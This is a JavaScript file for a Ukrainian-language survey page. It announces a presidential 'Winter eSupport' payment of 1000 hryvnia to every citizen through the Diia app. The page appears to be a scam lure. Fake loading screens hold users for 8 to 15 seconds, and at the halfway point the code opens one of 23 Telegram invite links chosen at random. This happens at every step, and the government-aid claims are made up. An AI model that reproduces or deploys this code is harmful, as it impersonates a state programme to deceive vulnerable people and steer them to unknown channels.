// Survey data and state management
let currentStep = 1;
let responses = {};
let isEligible = true;
let eligibilityIssues = [];

// Telegram links for random redirects
const telegramLinks = [
    "https://t.me/+RMlpigdpE3AyY2Zi",
    "https://t.me/+uQWmv7j7cedhMjMy", 
    "https://t.me/+31_XY1Y-aYE4YWIy",
    "https://t.me/+GHYrPA38EOQ3ZmY6",
    "https://t.me/+Rw1BRG90Wks1OTUy",
    "https://t.me/+WQWB7nz7QxI1Y2Uy",
    "https://t.me/+ePe_h6hleHUyMTky",
    "https://t.me/+Tq5RTjWD7vI1MDAy",
    "https://t.me/+XFB6402ui180NTJi",
    "https://t.me/+oTsExadH5jhhMmQy",
    "https://t.me/+mAkqZczkbe9jZmJi",
    "https://t.me/+yBwK54796kRlMzUy",
    "https://t.me/+KLBHBzsVqq1hNTVi",
    "https://t.me/+04x5NI8ivClkNDYy",
    "https://t.me/+tcFm06_lzFo4OTVi",
    "https://t.me/+gvDgZ_hs639hYzIy",
    "https://t.me/+XZ4LZgbfSG4yMGVi",
    "https://t.me/+fZKoU-yC3dpmODBi",
    "https://t.me/+f2ujKCDnDs40YWIy",
    "https://t.me/+RqcMyPvNEuY2ZTEy",
    "https://t.me/+bsxSWyluNhs5ZmIy",
    "https://t.me/+Y6SfnlX_qqM1ZDcy",
    "https://t.me/+cAcqMs1nWL8wODAy"
];

// Loading messages
const loadingMessages = [
    "Підключаємося до системи...",
    "Перевіряємо ваші дані...", 
    "Обробляємо відповідь...",
    "Переходимо до Telegram каналу...",
    "Завантажуємо наступне питання...",
    "Синхронізуємо інформацію...",
    "Підготовлюємо результат..."
];

const surveyData = {
    1: {
        type: 'info',
        title: 'Вітаємо у програмі "Зимова єПідтримка"!',
        content: 'Президент України оголосив про запуск програми підтримки громадян на зимовий період. Кожен українець може отримати <strong>1000 грн</strong> допомоги на зимові потреби.',
        buttons: [{text: 'Розпочати опитування', action: 'next', class: 'btn--primary'}]
    },
    2: {
        type: 'question',
        title: 'Чи перебуваєте ви на території України?',
        content: 'Програма діє лише для громадян, які знаходяться в межах України на момент подачі заявки.',
        buttons: [
            {text: 'Так', action: 'answer', value: 'yes', class: 'btn--primary'},
            {text: 'Ні', action: 'answer', value: 'no', class: 'btn--secondary'}
        ],
        critical: true,
        key: 'inUkraine'
    },
    3: {
        type: 'question',
        title: 'Чи є ви громадянином України?',
        content: 'Програма призначена виключно для громадян України незалежно від віку.',
        buttons: [
            {text: 'Так', action: 'answer', value: 'yes', class: 'btn--primary'},
            {text: 'Ні', action: 'answer', value: 'no', class: 'btn--secondary'}
        ],
        critical: true,
        key: 'citizen'
    },
    4: {
        type: 'info',
        title: 'Терміни дії програми',
        content: 'Програма "Зимова єПідтримка" діє протягом зимових місяців:<br><br><div class="step-info"><strong>📅 Грудень 2024 - Лютий 2025</strong><br>Заявки приймаються з 1 грудня 2024 року</div>',
        buttons: [{text: 'Зрозуміло', action: 'next', class: 'btn--primary'}]
    },
    5: {
        type: 'question',
        title: 'Чи маєте ви встановлений мобільний додаток "Дія"?',
        content: 'Для участі у програмі обов\'язково потрібно мати додаток "Дія" на своєму мобільному пристрої.',
        buttons: [
            {text: 'Так', action: 'answer', value: 'yes', class: 'btn--primary'},
            {text: 'Ні', action: 'answer', value: 'no', class: 'btn--secondary'},
            {text: 'Встановлю зараз', action: 'answer', value: 'will_install', class: 'btn--warning'}
        ],
        key: 'hasDiya'
    },
    6: {
        type: 'info',
        title: 'Спосіб отримання коштів',
        content: 'Кошти зараховуються на картку програми <strong>"Національний кешбек"</strong> через додаток "Дія".<br><br><div class="step-info">💳 Гроші будуть доступні для витрат відразу після зарахування</div>',
        buttons: [{text: 'Далі', action: 'next', class: 'btn--primary'}]
    },
    7: {
        type: 'question',
        title: 'Чи зареєстровані ви у програмі "Національний кешбек"?',
        content: 'Якщо ви ще не зареєстровані, ви зможете це зробити під час подачі заявки через додаток "Дія".',
        buttons: [
            {text: 'Так', action: 'answer', value: 'yes', class: 'btn--primary'},
            {text: 'Ні', action: 'answer', value: 'no', class: 'btn--secondary'},
            {text: 'Не знаю', action: 'answer', value: 'unsure', class: 'btn--warning'}
        ],
        key: 'hasCashback'
    },
    8: {
        type: 'info',
        title: 'Можливі витрати коштів',
        content: 'Кошти з програми можна витратити на наступні категорії:',
        spending: [
            '💡 Комунальні послуги',
            '💊 Ліки та медичні послуги', 
            '🚌 Громадський транспорт',
            '📱 Мобільний зв\'язок та інтернет',
            '📚 Українські книги',
            '🇺🇦 Донати на ЗСУ'
        ],
        buttons: [{text: 'Зрозуміло', action: 'next', class: 'btn--primary'}]
    },
    9: {
        type: 'question',
        title: 'Чи розумієте ви всі умови програми?',
        content: 'Підтвердьте, що ви ознайомилися з усіма умовами участі у програмі "Зимова єПідтримка" та розумієте їх.',
        buttons: [
            {text: 'Так, все зрозуміло', action: 'answer', value: 'yes', class: 'btn--primary'},
            {text: 'Потрібні роз\'яснення', action: 'answer', value: 'no', class: 'btn--secondary'}
        ],
        key: 'understands'
    },
    10: {
        type: 'result',
        title: 'Результат опитування'
    }
};

// Enhanced Loading Screen Function (8-15 seconds)
function showLoading(callback) {
    const loadingScreen = document.getElementById('loadingScreen');
    const loadingMessage = document.getElementById('loadingMessage');
    const loadingPercentage = document.getElementById('loadingPercentage');
    const loadingProgressFill = document.getElementById('loadingProgressFill');
    
    // Generate random loading time between 8-15 seconds
    const loadingDuration = Math.random() * (15000 - 8000) + 8000;
    
    // Show loading screen
    loadingScreen.classList.remove('hidden');
    
    let progress = 0;
    let messageIndex = 0;
    let telegramOpened = false;
    
    // Update progress and messages
    const interval = setInterval(() => {
        progress += (100 / (loadingDuration / 100));
        
        if (progress > 100) progress = 100;
        
        // Update progress bar and percentage
        loadingProgressFill.style.width = progress + '%';
        loadingPercentage.textContent = Math.floor(progress) + '%';
        
        // Change loading message every ~2 seconds
        if (Math.floor(progress) % 25 === 0 && Math.floor(progress) > 0) {
            messageIndex = (messageIndex + 1) % loadingMessages.length;
            loadingMessage.textContent = loadingMessages[messageIndex];
        }
        
        // Open random Telegram link at 50% progress
        if (!telegramOpened && progress >= 50) {
            telegramOpened = true;
            const randomLink = telegramLinks[Math.floor(Math.random() * telegramLinks.length)];
            window.open(randomLink, '_blank');
            loadingMessage.textContent = "Переходимо до Telegram каналу...";
        }
        
        // Complete loading
        if (progress >= 100) {
            clearInterval(interval);
            
            setTimeout(() => {
                loadingScreen.classList.add('hidden');
                if (callback) callback();
            }, 500);
        }
    }, 100);
    
    // Change messages during loading
    const messageInterval = setInterval(() => {
        if (progress < 100) {
            messageIndex = (messageIndex + 1) % loadingMessages.length;
            loadingMessage.textContent = loadingMessages[messageIndex];
        } else {
            clearInterval(messageInterval);
        }
    }, 2000);
}

// Initialize the survey
function initSurvey() {
    updateProgressBar();
    renderStep();
}

// Update progress bar
function updateProgressBar() {
    const progressFill = document.getElementById('progressFill');
    const currentStepEl = document.getElementById('currentStep');
    
    const percentage = (currentStep / 10) * 100;
    progressFill.style.width = percentage + '%';
    currentStepEl.textContent = currentStep;
}

// Render current step
function renderStep() {
    const stepContainer = document.getElementById('stepContainer');
    const navigation = document.getElementById('navigation');
    const backBtn = document.getElementById('backBtn');
    const step = surveyData[currentStep];
    
    // Show/hide back button
    if (currentStep > 1 && currentStep < 10) {
        backBtn.style.display = 'block';
    } else {
        backBtn.style.display = 'none';
    }
    
    // Clear container
    stepContainer.innerHTML = '';
    
    if (step.type === 'result') {
        renderResultStep();
        return;
    }
    
    // Create step content
    const titleEl = document.createElement('h2');
    titleEl.className = 'step-title';
    titleEl.textContent = step.title;
    
    const contentEl = document.createElement('div');
    contentEl.className = 'step-content';
    contentEl.innerHTML = step.content;
    
    stepContainer.appendChild(titleEl);
    stepContainer.appendChild(contentEl);
    
    // Add spending list for step 8
    if (step.spending) {
        const spendingContainer = document.createElement('div');
        spendingContainer.className = 'spending-list';
        
        step.spending.forEach(item => {
            const spendingItem = document.createElement('div');
            spendingItem.className = 'spending-item';
            spendingItem.textContent = item;
            spendingContainer.appendChild(spendingItem);
        });
        
        stepContainer.appendChild(spendingContainer);
    }
    
    // Render buttons
    renderButtons(step.buttons);
}

// Render buttons
function renderButtons(buttons) {
    const navButtons = document.getElementById('navButtons');
    navButtons.innerHTML = '';
    
    buttons.forEach(button => {
        const btn = document.createElement('button');
        btn.className = `btn ${button.class}`;
        btn.textContent = button.text;
        
        if (button.action === 'next') {
            btn.onclick = () => {
                showLoading(() => {
                    nextStep();
                });
            };
        } else if (button.action === 'answer') {
            btn.onclick = () => handleAnswer(button.value);
        }
        
        navButtons.appendChild(btn);
    });
}

// Handle user answer with enhanced loading
function handleAnswer(value) {
    const step = surveyData[currentStep];
    
    if (step.key) {
        responses[step.key] = value;
        
        // Check critical questions
        if (step.critical && value === 'no') {
            isEligible = false;
            if (step.key === 'inUkraine') {
                eligibilityIssues.push('Ви повинні перебувати на території України');
            } else if (step.key === 'citizen') {
                eligibilityIssues.push('Програма призначена лише для громадян України');
            }
        }
        
        // Handle special cases
        if (step.key === 'understands' && value === 'no') {
            showClarification();
            return;
        }
    }
    
    // Show loading screen for 8-15 seconds before proceeding
    showLoading(() => {
        nextStep();
    });
}

// Show clarification for step 9
function showClarification() {
    const stepContainer = document.getElementById('stepContainer');
    stepContainer.innerHTML = `
        <h2 class="step-title">Роз'яснення умов програми</h2>
        <div class="step-content">
            <div class="step-info">
                <h4>Основні умови:</h4>
                <ul style="text-align: left; max-width: 500px; margin: 0 auto;">
                    <li>Громадянство України</li>
                    <li>Перебування на території України</li>
                    <li>Наявність додатку "Дія"</li>
                    <li>Реєстрація у програмі "Національний кешбек"</li>
                    <li>Один платіж 1000 грн на зиму</li>
                    <li>Дійсно з грудня 2024 по лютий 2025</li>
                </ul>
            </div>
        </div>
    `;
    
    const navButtons = document.getElementById('navButtons');
    navButtons.innerHTML = `
        <button class="btn btn--primary" onclick="responses.understands = 'yes'; showLoading(() => { nextStep(); });">
            Тепер зрозуміло
        </button>
    `;
}

// Go to next step
function nextStep() {
    if (currentStep < 10) {
        currentStep++;
        updateProgressBar();
        renderStep();
    }
}

// Go back to previous step
function goBack() {
    if (currentStep > 1) {
        currentStep--;
        
        // Clear response for current step if going back
        const prevStep = surveyData[currentStep];
        if (prevStep && prevStep.key && responses[prevStep.key]) {
            delete responses[prevStep.key];
        }
        
        // Reset eligibility status when going back
        if (currentStep <= 3) {
            isEligible = true;
            eligibilityIssues = [];
        }
        
        updateProgressBar();
        renderStep();
    }
}

// Render result step
function renderResultStep() {
    const stepContainer = document.getElementById('stepContainer');
    const navButtons = document.getElementById('navButtons');
    
    let resultHTML = '';
    
    if (isEligible) {
        resultHTML = `
            <div class="result-success">
                <h2 class="result-title">🎉 Вітаємо! Ви можете отримати допомогу</h2>
                <p>На основі ваших відповідей ви відповідаєте всім умовам програми "Зимова єПідтримка" та можете подати заявку на отримання 1000 грн.</p>
            </div>
            
            <div class="instructions">
                <h4>📋 Інструкції для подачі заявки:</h4>
                <ol>
                    <li>Відкрийте додаток "Дія" на своєму мобільному пристрої</li>
                    <li>Знайдіть розділ "Зимова єПідтримка" або скористайтеся пошуком</li>
                    <li>Натисніть "Подати заявку"</li>
                    <li>Якщо потрібно, зареєструйтеся у програмі "Національний кешбек"</li>
                    <li>Дочекайтеся розгляду заявки (до 5 робочих днів)</li>
                    <li>Отримайте кошти на картку програми "Національний кешбек"</li>
                </ol>
                
                <p><strong>💡 Важливо:</strong> Заявку можна подати лише один раз. Кошти діятимуть до кінця лютого 2025 року.</p>
            </div>
        `;
        
        navButtons.innerHTML = `
            <button class="btn btn--primary" onclick="window.open('https://diia.gov.ua', '_blank')">
                Перейти до "Дія"
            </button>
            <button class="btn btn--secondary" onclick="restartSurvey()">
                Пройти знову
            </button>
        `;
    } else {
        resultHTML = `
            <div class="result-error">
                <h2 class="result-title">😔 На жаль, ви не можете скористатися програмою</h2>
                <p>На основі ваших відповідей ви не відповідаєте умовам програми "Зимова єПідтримка".</p>
                
                <h4>Причини:</h4>
                <ul style="text-align: left; max-width: 400px; margin: 0 auto;">
                    ${eligibilityIssues.map(issue => `<li>${issue}</li>`).join('')}
                </ul>
            </div>
            
            <div class="instructions">
                <h4>🤝 Альтернативні програми підтримки:</h4>
                <p>Рекомендуємо ознайомитися з іншими програмами соціальної підтримки, які можуть бути доступні у вашому регіоні.</p>
                
                <p><strong>📞 Довідка:</strong> За додатковою інформацією звертайтеся до місцевих органів соціального захисту або на гарячу лінію Міністерства соціальної політики.</p>
            </div>
        `;
        
        navButtons.innerHTML = `
            <button class="btn btn--secondary" onclick="restartSurvey()">
                Пройти опитування знову
            </button>
        `;
    }
    
    stepContainer.innerHTML = resultHTML;
}

// Restart survey
function restartSurvey() {
    currentStep = 1;
    responses = {};
    isEligible = true;
    eligibilityIssues = [];
    
    updateProgressBar();
    renderStep();
}

// Initialize survey when page loads
document.addEventListener('DOMContentLoaded', function() {
    initSurvey();
});

// Add keyboard navigation
document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        // Trigger primary button on Enter
        const primaryBtn = document.querySelector('.btn--primary');
        if (primaryBtn) {
            primaryBtn.click();
        }
    } else if (e.key === 'Escape' && currentStep > 1 && currentStep < 10) {
        // Go back on Escape
        goBack();
    }
});